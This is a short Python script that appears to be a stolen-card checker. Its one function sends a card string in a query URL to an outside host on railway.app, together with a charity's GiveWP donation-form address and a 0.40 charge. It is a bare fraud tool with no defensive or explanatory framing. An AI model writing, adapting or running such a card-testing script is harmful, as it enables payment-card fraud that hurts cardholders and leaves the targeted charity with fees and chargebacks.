import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://donbosco2000.org/donations/givewp-donation-form/?lang=en"
	price="0.40"
	res=requests.get(f'http://pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
